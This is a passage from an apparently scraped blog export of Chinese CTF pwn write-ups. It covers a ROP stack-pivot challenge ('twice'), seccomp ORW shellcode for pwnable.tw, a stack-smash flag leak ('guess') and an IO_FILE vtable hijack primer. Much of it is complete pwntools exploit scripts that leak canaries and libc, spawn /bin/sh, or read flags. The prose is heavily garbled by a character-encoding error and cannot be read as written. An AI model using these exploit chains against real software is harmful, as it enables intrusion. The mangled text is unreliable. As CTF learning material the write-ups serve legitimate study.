&quot;)libc=u64(p.recv(6)+&quot;\\x00\\x00&quot;)-0x7ffff7dcfca0+0x7ffff79e4000print hex(libc)edit(6,p64(libc+0x003ed8e8))edit(0,&quot;/bin/sh\\x00&quot;)add(10)add(11)edit(11,p64(libc+0x04f440))delete(0)p.interactive() 0x01 . twiceâ€‹ æœ¬è´¨ä¸Šæ˜¯ä¸ªropé¢˜ã€‚ã€‚ã€‚ä½†æ˜¯ç¡®å®éå¸¸è´¹è„‘å­ï¼Œçœ‹å¾—å¤´ç§ƒï¼Œæœ‰çš„è°ƒè¯•è¿˜æ²¡æ•´æ˜ç™½ï¼Œä¹‹åå†è¯¦ç»†ç ”ç©¶æ¼æ´åŸç†ã€‚ â€‹ ä¸»å‡½æ•°å¦‚ä¸‹ï¼Œä¸»è¦åŠŸèƒ½æ˜¯éå†è°ƒç”¨judge1ï¼Œå®é™…ä¸Šåªèƒ½æˆåŠŸè°ƒç”¨ä¸¤æ¬¡ã€‚ â€‹ judge1æ˜¯ç¨‹åºçš„ä¸»è¦å‡½æ•°ï¼Œå®ç°äº†è¯»å…¥çš„åŠŸèƒ½ï¼Œè¯»å…¥çš„å­—èŠ‚æ•°ç”±judge2å†³å®šã€‚è€Œä¸”å¦‚æœncountä¸ä¸º0æˆ–1ï¼Œåˆ™è¿”å›å€¼ä¸º0ï¼Œè¿™ä¹Ÿå°±é™å®šäº†ä¸»å‡½æ•°ä¸­çš„forå¾ªç¯ä»…è¿›è¡Œä¸¤æ¬¡ã€‚ â€‹ judge2ä¸­é™å®šäº†ï¼Œncountä¸º0æ—¶è¿”å›å€¼ä¸º89ï¼Œncountä¸º1æ—¶è¿”å›å€¼ä¸º112ï¼Œå…¶ä»–æƒ…å†µä¸‹ä¸å…è®¸è¯»å…¥ã€‚ â€‹ ç¨‹åºçš„ä¸»è¦åŠŸèƒ½æ˜¯å…è®¸è¿›è¡Œä¸¤æ¬¡è¯»å…¥ï¼Œç¬¬ä¸€æ¬¡è¯»å…¥89å­—èŠ‚ï¼Œç¬¬äºŒæ¬¡112å­—èŠ‚ï¼Œä½†æ˜¯bufçš„é•¿åº¦æ˜¯88ï¼Œå› æ­¤ä¼šæº¢å‡ºä¸€ä¸ªå­—èŠ‚ã€‚ â€‹ åˆ©ç”¨è¿™ä¸ªæº¢å‡ºï¼Œå†åŠ ä¸Šreadè¯»å…¥æ•°æ®ä¸åŠ ä»¥è¡¥â€œ\\x00â€çš„ç‰¹æ€§ï¼Œåœ¨readçš„ä¸‹ä¸€æ­¥è¿›è¡Œputsæ—¶ï¼Œç¨‹åºä¼šè¾“å‡ºåˆ°ä¸‹ä¸€ä¸ªâ€\\x00â€ä¸ºæ­¢ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥æ³„éœ²å‡ºæ—§çš„rbpåœ°å€ä»¥åŠcanaryçš„å€¼ã€‚ â€‹ ä¸è¿‡ç¨‹åºå¼€å¯äº†NXä¿æŠ¤ï¼Œæ ˆä¸Šä»£ç ä¸å¯æ‰§è¡Œï¼Œä¸èƒ½ç›´æ¥å†™shellcodeã€‚è¿™é‡Œéœ€è¦ç”¨åˆ°æ–°çŸ¥è¯†ï¼Œæ ˆè½¬ç§»æŠ€æœ¯ï¼ˆframe fakingï¼‰ï¼Œåˆ¶ä½œä¸€ä¸ªå‡çš„æ ˆå¸§è¿›è¡Œropã€‚å› ä¸ºç¨‹åºä¸­æ²¡æœ‰systemå‡½æ•°ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦ç”¨ropæ³„éœ²å‡ºlibcåŸºå€ï¼Œå†è¿›è¡Œropè°ƒç”¨system(â€œ/bin/shâ€) â€‹ frame fakingçš„å¤§è‡´payloadæ ¼å¼ä¸ºï¼š â€‹ |xxxx xxxx|rop chain|padding|fake ebp|leave addr| â€‹ å°†è¿”å›åœ°å€è¦†ç›–ä¸ºleaveæ±‡ç¼–ä»£ç çš„åœ°å€ï¼Œè¿™æ ·readå‡½æ•°ç»“æŸåå…ˆè¿›è¡Œæœ¬èº«å‡½æ•°çš„leaveæ“ä½œï¼Œå†è·³è½¬åˆ°æŒ‡å®šåœ°å€ï¼ˆå³leaveåœ°å€ï¼‰åˆè¿›è¡Œä¸€æ¬¡leaveæ“ä½œï¼Œä½¿å¾—rspå’ŒrbpæŒ‡å‘rop chainçš„é€‚å½“ä½ç½®ï¼Œå¾—ä»¥æ‰§è¡Œæˆ‘ä»¬è®¾è®¡çš„fake stack frameã€‚ â€‹ å°†rop chainç»†åŒ–å¯ä»¥å¾—åˆ°å¦‚ä¸‹payloadï¼š â€‹ |xxxx xxxx|arg1|arg2|â€¦|fuction addr|ret addr|padding|fake ebp|leave addr| â€‹ ä¸ºäº†å¤šæ¬¡è¿›è¡Œleakï¼Œéœ€è¦æŠŠä¸Šè¿°ret addrå³å‡æ ˆå¸§çš„è¿”å›åœ°å€ï¼Œå†è®¾ç½®ä¸ºæ¼æ´æ‰€åœ¨å‡½æ•°ï¼Œå³å¯é‡å¤è°ƒç”¨ã€‚ â€‹ æ­¤å¤„éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œrop chainä¸­å¯èƒ½éœ€è¦è¿›è¡Œå¼¹æ ˆæ“ä½œï¼Œéœ€è¦åˆ©ç”¨ROPgardgeæŸ¥æ‰¾ç›¸åº”çš„åœ°å€ã€‚ â€‹ payloadå‚è€ƒ 123456789101112131415161718192021222324252627282930313233343536373839404142from pwn import *context.log_level = &#x27;debug&#x27; p = process(&#x27;./twice&#x27;)puts_plt_addr = 0x4005C0read_got_addr = 0x601038pop_rdi = 0x400923leave = 0x400879main_addr = 0x40087Bp.recvuntil(&#x27;&gt;&#x27;)payload = &#x27;a&#x27;*88+&#x27;\\n&#x27;p.send(payload)p.recv(89)canary = u64(&#x27;\\x00&#x27;+p.recv(7))success(hex(canary))rbp = u64(p.recvuntil(&#x27;\\n&#x27;)[:-1].ljust(8,&#x27;\\x00&#x27;))-112success(hex(rbp))p.recvuntil(&#x27;&gt;&#x27;)payload = p64(0)+p64(pop_rdi)+p64(read_got_addr)+p64(puts_plt_addr)+p64(main_addr)payload += &#x27;a&#x27;*8*6+p64(canary)+p64(rbp)+p64(leave)p.send(payload)p.recvuntil(&#x27;\\n&#x27;)libc_addr = u64(p.recv(6).ljust(8,&#x27;\\x00&#x27;))-0xEE590sp.recvuntil(&#x27;&gt;&#x27;)payload = &#x27;a&#x27;*88+&#x27;\\n&#x27;p.send(payload)p.recv(89)canary = u64(&#x27;\\x00&#x27;+p.recv(7))success(hex(canary))rbp2 = u64(p.recvuntil(&#x27;\\n&#x27;)[:-1].ljust(8,&#x27;\\x00&#x27;))-112success(hex(rbp2))p.recvuntil(&#x27;&gt;&#x27;)payload = p64(0)+p64(pop_rdi)+p64(libc_addr+0x1881AC)+p64(libc_addr+0x48880)+p64(main_addr)payload += &#x27;a&#x27;*8*6+p64(canary)+p64(rbp2)+p64(leave)p.send(payload)p.interactive()","categories":[],"tags":[{"name":"WriteUp","slug":"WriteUp","permalink":"http://example.com/tags/WriteUp/"}]},{"title":"Seccomp Sandbox (ORW)","slug":"sandbox","date":"2020-07-07T13:14:08.000Z","updated":"2021-03-24T09:47:06.974Z","comments":true,"path":"2020/07/07/sandbox/","link":"","permalink":"http://example.com/2020/07/07/sandbox/","excerpt":"â€‹ freebufå…¬å¼€è¯¾pwnç¬¬äº”è¯¾æ€»ç»“ã€‚","text":"â€‹ freebufå…¬å¼€è¯¾pwnç¬¬äº”è¯¾æ€»ç»“ã€‚ 0x00 . æ²™ç®±â€‹ æ²™ç®±æ˜¯ä¸€ä¸ªè™šæ‹Ÿç³»ç»Ÿç¨‹åºï¼Œæ²™ç®±æä¾›çš„ç¯å¢ƒç›¸å¯¹äºæ¯ä¸€ä¸ªè¿è¡Œçš„ç¨‹åºéƒ½æ˜¯ç‹¬ç«‹çš„ï¼Œè€Œä¸”ä¸ä¼šå¯¹ç°æœ‰çš„ç³»ç»Ÿäº§ç”Ÿå½±å“ï¼Œå³æ²™ç®±æä¾›ä¸€ä¸ªé™åˆ¶è¯¥åº”ç”¨ç¨‹åºå¯¹ç³»ç»Ÿèµ„æºçš„è®¿é—®æƒé™ã€‚å¦‚æœç¨‹åºè°ƒç”¨äº†æ²™ç®±å‡½æ•°ï¼Œä¹Ÿå°±æ˜¯è¯´åé¢æ‰§è¡Œçš„ä»£ç éƒ½ä¼šåœ¨è¿™ä¸ªæ²™ç®±ä¸­è¿›è¡Œã€‚è€Œæ²™ç®±ä¼šé™åˆ¶è®¸å¤šåº“å‡½æ•°å¯¼è‡´å…¶æ— æ³•ä½¿ç”¨ã€‚æ‰€ä»¥å¦‚æœè¦getshellï¼Œè¦ä¹ˆä»…åˆ©ç”¨å½“å‰æ²™ç®±å…è®¸çš„ç¨‹åºè¿›è¡Œgetshellï¼Œè¦ä¹ˆè¿›è¡Œæ²™ç®±é€ƒé€¸(ä¸€èˆ¬æŒ‡çš„æ˜¯pythonæ²™ç®±é€ƒé€¸)ã€‚å…·ä½“æ–¹å¼éœ€è¦ç»“åˆå®é™…çš„ç¯å¢ƒå’Œæƒ…å†µã€‚ 0x01 . ORWâ€‹ orwæŒ‡çš„æ˜¯ä¸‰ä¸ªæœ€åŸºæœ¬çš„åº“å‡½æ•°ï¼Œopenï¼Œreadï¼Œwriteã€‚å¾ˆå¤šæ—¶å€™é¢˜ç›®ä¼šè¦æ±‚æˆ‘ä»¬ä»…ç”¨è¿™ä¸‰ä¸ªå‡½æ•°å®ç°getshellã€‚å¤§è‡´ç¨‹åºæµç¨‹ä¸ºï¼š 123fd = open(&quot;/home/test/flag&quot;); //ç”¨openå‡½æ•°æ‰“å¼€flagæ–‡ä»¶å¹¶è·å–ç´¢å¼•read(fd,buf,0x100); //å°†æ–‡ä»¶ä¸­çš„æ–‡æœ¬é€šè¿‡readå‡½æ•°è¾“å…¥åˆ°bufä¸­write(1,buf,0x100); //ç”¨writeå‡½æ•°è¾“å‡ºbuf 0x02 . orw From pwnable.twâ€‹ åœ¨pwnable.twä¸Šæ‰¾äº†ä¸€ä¸ªæ²™ç®±ä¾‹é¢˜ã€‚ 1.Analysisâ€‹ ä¾‹è¡Œå…¬äº‹1ï¼š â€‹ ä¾‹è¡Œå…¬äº‹2ï¼š â€‹ ä¾‹è¡Œå…¬äº‹3ï¼š â€‹ è¿è¡Œä¹‹åæ˜¯segment faultã€‚ â€‹ åœ¨ida32ä¸Šå¯ä»¥çœ‹åˆ°mainå‡½æ•°ååˆ†ç®€çŸ­ï¼Œè€Œä¸”å‘ç°äº†å¤§å¤§çš„orw_seccomp()ï¼Œå¯ä»¥ç¡®å®šç¨‹åºå­˜åœ¨æ²™ç®±æ²¡è·‘äº†ã€‚ â€‹ è€Œæ²™ç®±å‡½æ•°åé¢çš„ç¨‹åºï¼Œå¤§æ„å°±æ˜¯è¾“å…¥shellcodeå¹¶ç”¨å‡½æ•°æŒ‡é’ˆæ‰§è¡Œã€‚ä½†æ˜¯å› ä¸ºå­˜åœ¨æ²™ç®±ï¼Œæ‰€ä»¥å½“ç„¶ä¸èƒ½ç›´æ¥æ‰§è¡Œsystem(â€œ/bin/shâ€)ã€‚å…ˆç”¨seccomp-toolsæ¥çœ‹çœ‹ç¨‹åºæ²™ç®±çš„é™åˆ¶ã€‚ â€‹ ç¨‹åºä¸­orwçš„ä¸‰ä¸ªå‡½æ•°éƒ½æ˜¯å¯ä»¥è°ƒç”¨çš„ã€‚å› æ­¤éœ€è¦é€šè¿‡è¿™ä¸‰ä¸ªå‡½æ•°å†™shellcodeã€‚ 2.Shellcodeâ€‹ æˆ‘ä»¬å·²ç»çŸ¥é“äº†åªè¿ç”¨orwä¸‰ä¸ªå‡½æ•°å¦‚ä½•è·å–flagï¼Œç°åœ¨åªéœ€è¦æŠŠæ•´ä¸ªæµç¨‹å†™æˆæ±‡ç¼–çš„shellcodeå³å¯ã€‚ â€‹ é™¤æ­¤ä¹‹å¤–è¿˜éœ€è¦æŸ¥ä¸€ä¸‹ç³»ç»Ÿè°ƒç”¨å‡½æ•°éœ€è¦ç”¨åˆ°é‚£äº›å¯„å­˜å™¨ï¼ŒåŠå…¶åˆ†åˆ«æœ‰å“ªäº›ä½œç”¨ï¼š a . fd = open(â€œ/home/orw/flagâ€)123456789xor eax,eax;xor ebx,ebx; //åˆå§‹åŒ–xor ecx,ecx;xor edx,edx;mov eax,0x5; //opençš„ç³»ç»Ÿè°ƒç”¨ç ä¸º0x5push 0x00006761; //flagè·¯å¾„ï¼Œéœ€è¦è¡¥0push 0x6c662f77; //é€†åºpush 0x726f2f65; //å‹æ ˆæš‚å­˜push 0x6d6f682f; mov ebx,esp; //è·¯å¾„ä¿å­˜è‡³ebxint 0x80; b . read(fd,buf,0x30);12345mov ebx,eax; //ä¸Šä¸€å‡½æ•°åï¼Œeaxå·²è·å¾—fdmov ecx,esp; //å°†è·¯å¾„çš„flagæ–‡ä»¶readåˆ°æ ˆä¸Šmov edx,0x30; //è¯»å–å­—èŠ‚æ•°ä¸º0x30mov eax,0x03; //readçš„ç³»ç»Ÿè°ƒç”¨ç ä¸º0x3int 0x80; c.write(1,buf,0x30)12345mov eax,0x4; //writeçš„ç³»ç»Ÿè°ƒç”¨ç ä¸º0x4mov ebx,0x1; //fd = stdoutmov ecx,ecx; //è¦è¾“å‡ºçš„flagåœ¨æ ˆä¸Šï¼Œä½†æ˜¯ecxå·²ç»æŒ‡å‘espäº†ï¼Œå› æ­¤æœ¬æ­¥å¯ä»¥ä¸å†™mov edx,0x30; //è¾“å‡ºå­—èŠ‚æ•°ä¸º0x30int 0x80; 3.Exploit1234567891011from pwn import *#p = process(&quot;./orw&quot;)p = remote(&quot;chall.pwnable.tw&quot;,10001)_open = &quot;xor eax,eax;xor ebx,ebx;xor ecx,ecx;xor edx,edx;push 0x00006761;push 0x6c662f77;push 0x726f2f65;push 0x6d6f682f;mov ebx,esp;mov eax,0x5;int 0x80;&quot;_read = &quot;mov ebx,eax;mov ecx,esp;mov edx,0x30;mov eax,0x3;int 0x80;&quot;_write = &quot;mov ebx,0x1;mov ecx,esp;mov edx,0x30;mov eax,0x4;int 0x80;&quot;payload = _open+_read+_writepayload = asm(payload)p.send(payload)print p.recv(0x20)p.interactive()","categories":[],"tags":[{"name":"Summary","slug":"Summary","permalink":"http://example.com/tags/Summary/"}]},{"title":"2018ç½‘é¼pwn (guesså¤ç°)","slug":"guess","date":"2020-04-13T12:14:08.000Z","updated":"2021-03-24T09:46:26.176Z","comments":true,"path":"2020/04/13/guess/","link":"","permalink":"http://example.com/2020/04/13/guess/","excerpt":"â€‹ 2018ç½‘é¼pwné¢˜å¤ç°ä¸å­¦ä¹ ã€‚","text":"â€‹ 2018ç½‘é¼pwné¢˜å¤ç°ä¸å­¦ä¹ ã€‚ â€‹ å› ä¸ºç½‘é¼ã€é“ä¸‰ã€å›½èµ›å·®ä¸å¤šäº†ï¼Œè€Œä¸”åˆ˜è€æ¿ä¹Ÿç»™äº†å»ºè®®ï¼Œå°±å†³å®šæ¥å¤ç°ä¸€ä¸‹2018ç½‘é¼çš„pwné¢˜ã€‚æ¯•ç«Ÿèµ›é¢˜æ¯”ä¸€èˆ¬çš„æ—§é¢˜ç›®å«é‡‘é‡æ›´å¤šï¼Œèƒ½å­¦åˆ°å¾ˆå¤šä¸œè¥¿ã€‚ â€‹ å†™é¢˜è§£ä¹‹å‰å…ˆè´´ä¸€äº›é“ºå«çŸ¥è¯†ï¼Œéƒ½æ˜¯è¿™ä¸ªé¢˜ç›®ä¼šç”¨åˆ°çš„ï¼Œä¹Ÿæ˜¯æ–°å­¦åˆ°çš„ã€‚ 0x00 . Stack Smashâ€‹ è¿™ä¸ªæŠ€æœ¯ç®—æ˜¯æ ˆæº¢å‡ºæŠ€æœ¯çš„ä¸€ç§ï¼Œä¹Ÿæ”¶å½•åœ¨CTF-Wikiä¸­ã€‚ â€‹ å¯¹äºå¼€å¯äº†canaryä¿æŠ¤çš„ç¨‹åºï¼Œæˆ‘ä»¬ä¸èƒ½ç›´æ¥è¿›è¡Œæ ˆæº¢å‡ºï¼Œå› ä¸ºä¼šç ´åcanaryçš„å€¼ã€‚ â€‹ å¦‚æœå‡½æ•°è¿”å›æ—¶æ£€æŸ¥åˆ°canaryè¢«ç ´åäº†ï¼Œå°±ä¼šè·³è½¬åˆ°__stack_chk_fail()å‡½æ•°å¼€å§‹æ‰§è¡Œã€‚ â€‹ çœ‹ä¸€ä¸‹åº“æ–‡ä»¶ä¸­çš„__stack_chk_fail()åŠå…¶å¼•ç”¨å‡½æ•°ï¼š â€‹ å†çœ‹ä¸€ä¸‹æºç (ç‰ˆæœ¬ä¸ºglibc-2.23)ï¼š â€‹ æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œ__stack_chk_fail()ä¼šè°ƒç”¨__fortify_fail()ï¼Œè€Œåè€…è¾“å‡ºäº†ä¸€è¡Œå­—ç¬¦ä¸²ï¼Œå®é™…ä¸Šæ˜¯ç”¨æ¥æç¤ºç”¨æˆ·è¯¥ç¨‹åºå‡ºé”™ï¼Œè€Œ__libc_argv[0]ä¸­å­˜çš„å°±æ˜¯ç¨‹åºåã€‚ â€‹ è€Œè¯¥å˜é‡ä½œä¸ºå‘½ä»¤è¡Œå‚æ•°ï¼Œå­˜åœ¨mainå‡½æ•°çš„æ ˆå¸§ä¸Šï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœæˆ‘ä»¬åœ¨æ ˆä¸Šå¯ä»¥è¿›è¡Œè¶³å¤Ÿé•¿çš„è¾“å…¥ï¼Œå°±èƒ½è¦†ç›–canaryï¼Œå†å°†æƒ³è¦æ³„éœ²çš„target_addrè¦†ç›–argv[0]ï¼Œæ­¤æ—¶ç³»ç»Ÿç›‘æµ‹åˆ°æº¢å‡ºï¼Œæ‰§è¡Œ__stack_chk_fail()å’Œ__fortify_fail()å°±èƒ½è¾“å‡ºtarget_getçš„å†…å®¹ã€‚ â€‹ ç”¨è¿™æ ·çš„æ ˆæº¢å‡ºç†è®ºä¸Šå®ç°äº†ä»»æ„è¯»ï¼ˆæ»¡è¶³è¯»æƒé™ï¼‰ï¼Œä½†æ˜¯æ³„éœ²äº†ä¹‹åç³»ç»Ÿå°±å…³é—­è¿›ç¨‹ï¼Œæ— æ³•ç»§ç»­æ”»å‡»ã€‚ 0x01 . Linux çˆ¶å­è¿›ç¨‹â€‹ åœ¨linuxç¨‹åºä¸­ï¼Œä¸€èˆ¬ç”¨forkå‡½æ•°æ¥åˆ›å»ºä¸€ä¸ªæ–°çš„å­è¿›ç¨‹ã€‚ â€‹ è¿™ä¸ªæ–°çš„å­è¿›ç¨‹ç†è®ºä¸Šç®—æ˜¯åŸè¿›ç¨‹çš„ä¸€ä¸ªå‰¯æœ¬ï¼Œæ‰§è¡Œfork()æ—¶ï¼Œç³»ç»Ÿå…ˆä¸ºå­è¿›ç¨‹åˆ†é…èµ„æºï¼Œå†å°†åŸè¿›ç¨‹çš„ä¸€ç³»åˆ—æ•°æ®å’Œå˜é‡å¤åˆ¶åˆ°å­è¿›ç¨‹ä¸­ã€‚è¿™ä¸ªå¤åˆ¶çš„ç»“æœæ˜¯ï¼Œæ•°æ®å’Œå˜é‡çš„å€¼éƒ½ä¸€æ ·ï¼Œåœ¨ç³»ç»Ÿä¸­çš„è™šæ‹Ÿåœ°å€æ˜¯ä¸€æ ·çš„ï¼Œä½†æ˜¯ç‰©ç†åœ°å€ä¸åŒï¼Œä¹Ÿå°±æ˜¯è¯´å°†æ•°æ®å¤åˆ¶åˆ°äº†å¦ä¸€ä¸ªç‰©ç†åœ°å€ï¼Œå³å‰¯æœ¬ã€‚ â€‹ è€Œæ–°è¿›ç¨‹åŸè¿›ç¨‹åœ¨fork()æ‰§è¡Œä¹‹åï¼Œè¿”å›å€¼ä¸ºå­è¿›ç¨‹çš„idã€‚é‚£ä¹ˆå¯¹äºv1å˜é‡ï¼ŒåŸè¿›ç¨‹çš„å€¼ä¸ºå­è¿›ç¨‹çš„idï¼Œå­è¿›ç¨‹æ²¡æœ‰å­è¿›ç¨‹ï¼Œv1è‡ªç„¶ä¸º0ã€‚å¦‚æœè¿”å›å€¼ä¸º-1ï¼Œå³åˆ›å»ºè¿›ç¨‹å¤±è´¥ã€‚ â€‹ å½“fork()æ‰§è¡Œç»“æŸï¼Œçˆ¶å­è¿›ç¨‹çš„ä¸‹ä¸€è¡Œä»£ç éƒ½æ˜¯if(v1 == -1)ï¼Œéƒ½ä»è¿™é‡Œå¼€å§‹æ‰§è¡Œã€‚ 0x02 . GUESSA . Analysisâ€‹ ç”¨idaæ‰“å¼€æ–‡ä»¶å¯ä»¥çœ‹è§ï¼Œç¨‹åºä¸€å¼€å§‹å°±å°†flag.txtè¯»å–åˆ°äº†æ ˆä¸Š: â€‹ ä¸è¿‡ç¨‹åºä¸­å­˜åœ¨canaryä¿æŠ¤ã€‚ â€‹ è·‘ä¸€ä¸‹ï¼Œå…¶å®å°±æ˜¯è®©ä½ è¾“å…¥flagã€‚è¾“å…¥AAAAAAAAã€‚ â€‹ gdbè°ƒè¯•çœ‹çœ‹æ ˆä¸Šçš„æƒ…å†µï¼Œå¯ä»¥çœ‹åˆ°flagçš„ç¡®åœ¨æ ˆä¸Šï¼ˆæ­¤å¤„ç”¨äº†æœ¬åœ°çš„flagï¼‰ã€‚ â€‹ å¯ä»¥å¾—çŸ¥ä»¥ä¸‹éƒ¨åˆ†å˜é‡çš„åœ°å€ã€‚ Variable Addr argv[0] 0x7fffffffdd88 flag.txt 0x7fffffffdc30 User Input 0x7fffffffdc60 â€‹ å…¶ä¸­argv[0]ä¸ºå‘½ä»¤è¡Œå‚æ•°ï¼Œå­˜çš„æ˜¯ç¨‹åºè·¯å¾„åŠç¨‹åºåâ€œGUESSâ€ã€‚ä¹‹æ‰€ä»¥è¦æåˆ°argv[0]æ˜¯å› ä¸ºæ­¤å¤„å¯ä»¥ç”¨åˆ°æœ¬æ–‡ä¸Šè¿°çš„èŠ±å¼æ ˆæº¢å‡ºæŠ€å·§stack smashã€‚å› ä¸ºç¨‹åºä¸­çš„ç”¨æˆ·è¾“å…¥æ˜¯ç”¨gets()å®ç°çš„ï¼Œå› æ­¤ç”¨æˆ‘ä»¬å¯ä»¥ç”¨inputå°†è¶³å¤Ÿé•¿çš„paddingå’Œputsçš„gotè¡¨å€¼è¦†ç›–åˆ°argv[0]ï¼Œä»è€Œæ³„éœ²libcåŸºå€ã€‚(0xdd88 - 0xdc60 == 0x128) â€‹ å¾—åˆ°äº†libcçš„åœ°å€ï¼Œæˆ‘ä»¬è¿˜éœ€è¦æ³„éœ²å¦ä¸€ä¸ªå˜é‡environã€‚è¿™ä¸ªå˜é‡å­˜çš„æ˜¯ç¨‹åºçš„æ ˆåŸºå€ï¼Œæˆ‘ä»¬å¯ä»¥æ ¹æ®flag.txtåœ¨æ ˆä¸Šçš„å›ºå®šåç§»ï¼Œæ¥ç¡®å®šflagçš„å®é™…åœ°å€ã€‚environå˜é‡è¢«å­˜åœ¨ç¬¦å·è¡¨ä¸­ï¼Œæ‰€ä»¥ä¹Ÿå¯ä»¥é€šè¿‡ä¸Šè¿°çš„stack smashæ³„éœ²gotè¡¨çš„æ–¹å¼å¾—åˆ°ã€‚ â€‹ gdbä¸‹æ–­ç‚¹å¾—åˆ°å½“å‰çš„æ ˆåœ°å€ã€‚ 12environ - flag_aar == 0x168environ - 0x168 == flag_aar â€‹ ç°åœ¨åªè¦å†ä¸€æ¬¡è¿›è¡Œstack smashæ³„éœ²å‡ºæ ˆä¸Šçš„flagå³å¯ã€‚ B . Exploit123456789101112131415161718192021222324252627from pwn import *context.log_level = &#x27;debug&#x27;p = process(&#x27;./guess&#x27;)elf = ELF(&#x27;./guess&#x27;)libc = ELF(&#x27;./libc-2.23.so&#x27;)payload = 0x128 * &#x27;B&#x27; + p64(elf.got[&#x27;puts&#x27;])p.sendlineafter(&quot;Please type your guessing flag&quot;,payload)#gdb.attach(p)p.recvuntil(&quot;*** stack smashing detected ***: &quot;)puts_gots = u64(p.recv(6).ljust(8,&#x27;\\0&#x27;))print &quot;puts_gots : &quot; + hex(puts_gots)libc_addr = puts_gots - libc.symbols[&#x27;puts&#x27;]print &quot;libc_addr : &quot; + hex(libc_addr)stack_addr = libc_addr + libc.symbols[&#x27;environ&#x27;]payload = 0x128 * &#x27;B&#x27; + p64(stack_addr)p.sendlineafter(&quot;Please type your guessing flag&quot;,payload)p.recvuntil(&quot;*** stack smashing detected ***: &quot;)stack_addr = u64(p.recv(6).ljust(8,&#x27;\\0&#x27;))print &quot;stack_addr : &quot; + hex(stack_addr)payload = 0x128 * &#x27;C&#x27; + p64(stack_addr - 0x168)p.sendlineafter(&quot;Please type your guessing flag&quot;,payload)p.recvuntil(&quot;*** stack smashing detected ***: &quot;)p.interactive()","categories":[],"tags":[{"name":"WriteUp","slug":"WriteUp","permalink":"http://example.com/tags/WriteUp/"}]},{"title":"Vtable-Hijack(the_end)","slug":"Vtable-Hijack(the_end)","date":"2020-04-09T13:09:47.000Z","updated":"2021-03-24T09:49:11.506Z","comments":true,"path":"2020/04/09/Vtable-Hijack(the_end)/","link":"","permalink":"http://example.com/2020/04/09/Vtable-Hijack(the_end)/","excerpt":"â€‹ å…³äºIO FILE ä¸­çš„vtableåŠ«æŒã€‚","text":"â€‹ å…³äºIO FILE ä¸­çš„vtableåŠ«æŒã€‚ â€‹ å› ä¸ºåœ¨wctf2020ç¢°åˆ°äº†ä¸€ä¸ªè´¼ç®€å•(æ²¡åšå‡ºæ¥ğŸ™ƒ)çš„ioé‡å®šå‘é¢˜ç›®ï¼Œè€Œä¸”åˆ˜è€æ¿åˆ·how2heapçš„æ—¶å€™ä¹Ÿç¢°åˆ°äº†ä¸€äº›ioç›¸å…³çš„é¢˜ç›®ï¼Œæ‰€ä»¥æˆ‘æ„Ÿè§‰è¯¥ç¨å¾®äº†è§£äº†è§£pwnä¸­çš„ioã€‚ 0x00 . IOå…¥é—¨ â€”â€” åŸºæœ¬ç»“æ„ä½“â€‹ _IO_FILEæ˜¯æœ€åŸºæœ¬çš„ioæµç›¸å…³ç»“æ„ï¼Œé•¿è¿™æ ·ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647struct _IO_FILE &#123; int _flags; /* High-order word is _IO_MAGIC; rest is flags. */#define _IO_file_flags _flags /* The following pointers correspond to the C++ streambuf protocol. */ /* Note: Tk uses the _IO_read_ptr and _IO_read_end fields directly. */ char* _IO_read_ptr; /* Current read pointer */ char* _IO_read_end; /* End of get area. */ char* _IO_read_base; /* Start of putback+get area. */ char* _IO_write_base; /* Start of put area. */ char* _IO_write_ptr; /* Current put pointer. */ char* _IO_write_end; /* End of put area. */ char* _IO_buf_base; /* Start of reserve area. */ char* _IO_buf_end; /* End of reserve area. */ /* The following fields are used to support backing up and undo. */ char *_IO_save_base; /* Pointer to start of non-current get area. */ char *_IO_backup_base; /* Pointer to first valid character of backup area */ char *_IO_save_end; /* Pointer to end of non-current get area. */ struct _IO_marker *_markers; struct _IO_FILE *_chain; int _fileno;#if 0 int _blksize;#else int _flags2;#endif _IO_off_t _old_offset; /* This used to be _offset but it&#x27;s too small. */#define __HAVE_COLUMN /* temporary */ /* 1+column number of pbase(); 0 is unknown. */ unsigned short _cur_column; signed char _vtable_offset; char _shortbuf[1]; /* char* _save_gptr; char* _save_egptr; */ _IO_lock_t *_lock;#ifdef _IO_USE_OLD_IO_FILE&#125;;/* We always allocate an extra word following an _IO_FILE. This contains a pointer to the function jump table used. This is for compatibility with C++ streambuf; the word can be used to smash to a pointer to a virtual function table. */ â€‹ _IO_FILEä¸­æœ‰ä¸€ä¸ªæŒ‡é’ˆæˆå‘˜ä¸ºchainï¼Œå¯ä»¥å°†è¿›ç¨‹ä¸­æ‰€æœ‰çš„_IO_FILEç»“æ„ä¸²èµ·æ¥ï¼Œæ„æˆé“¾è¡¨ï¼Œé“¾è¡¨å¤´éƒ¨å­˜å‚¨åœ¨å…¨å±€å˜é‡_IO_list_allä¸­ã€‚å†æ¸…ç†ioæµçš„æ—¶å€™ä¼šéå†æ­¤é“¾è¡¨ã€‚ â€‹ è¿›ç¨‹ä¸€å¼€å§‹ï¼Œæœ¬æ¥å•¥ioæµéƒ½æ²¡æœ‰ï¼Œä½†æ˜¯æ²¡æœ‰ioå°±ä¸èƒ½å®ç°äº¤äº’ï¼Œæ‰€ä»¥æ‰€æœ‰è¿›ç¨‹éƒ½å­˜åœ¨ä¸‰ä¸ªè‡ªåŠ¨æ‰“å¼€çš„ioæµï¼šstdinï¼Œstdoutï¼Œstderrã€‚åˆ†åˆ«æ§åˆ¶ç¨‹åºçš„è¾“å…¥ï¼Œè¾“å‡ºå’ŒæŠ¥é”™ã€‚è¿™ä¸‰ä¸ªioæµéƒ½æ˜¯_IO_FILEç»“æ„ï¼Œåœ¨ç¬¦å·è¡¨ä¸­æ˜¯è¿™æ ·å­˜å‚¨çš„: 123_IO_2_1_stderr__IO_2_1_stdout__IO_2_1_stdin_ â€‹ _IO_FILE_plusåœ¨_IO_FILEçš„åŸºç¡€ä¸Šï¼ŒåŠ ä¸Šä¸€ä¸ªæŒ‡å‘_IO_jump_t ç»“æ„ä½“ï¼Œå«vtableçš„æŒ‡é’ˆï¼Œåˆå°è£…æˆäº†ä¸€ä¸ªç»“æ„ä½“ï¼š 12345struct _IO_FILE_plus&#123; _IO_FILE file; const struct _IO_jump_t *vtable;&#125;; â€‹ è€Œè¿™ä¸ªvtable(è™šè¡¨)æŒ‡å‘çš„ç»“æ„ä½“ï¼Œæ˜¯ä¸€å¼ 